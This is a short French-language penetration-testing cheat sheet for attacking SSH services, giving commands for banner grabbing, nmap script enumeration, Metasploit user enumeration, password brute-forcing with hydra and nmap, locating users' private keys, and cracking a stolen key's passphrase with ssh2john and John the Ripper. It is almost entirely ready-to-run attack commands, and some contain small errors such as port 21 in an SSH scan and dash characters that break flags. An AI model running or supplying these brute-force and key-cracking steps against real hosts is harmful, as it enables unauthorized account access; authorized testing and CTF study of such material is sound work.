1. Obtenir la bannière de connexion SSH (version)
```
nc -vn <IP> 22
```
2. Utiliser scripts nmap
```
nmap --script ssh-* -p 21 [ip]
nmap -p22 <ip> --script ssh2-enum-algos 
nmap -p22 <ip> --script ssh-hostkey --script-args ssh_hostkey=full
nmap -p22 <ip> --script ssh-auth-methods --script-args="ssh.user=root"
```
3. Enumérer les utilisateurs via metasploit
```
msf> use auxiliary/scanner/ssh/ssh_enumusers
```
4. Se connecter au service 
```
ssh [USER]@[IP]
ssh –i [KEY] [USER]@[IP]  # Connection avec cléf
```
4. Bruteforce
```
hydra [-L users.txt or -l user_name] [-P pass.txt or -p password] -f [-S port] ssh
nmap -p 22 –script ssh-brute –script-args userdb=[users.lst],passdb=[pass.lst] –script-args ssh-brute.timeout=4s [IP]
```
5. Chemin des cléfs 
```
$user/.ssh/id_rsa
$user/.ssh/authorized key
```
6. Cracker cléf privé
```
ssh2john id_rsa > id_rsa.hash
john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
ssh [USER]@[IP] -i [CLEF] # Via le MP de john
```
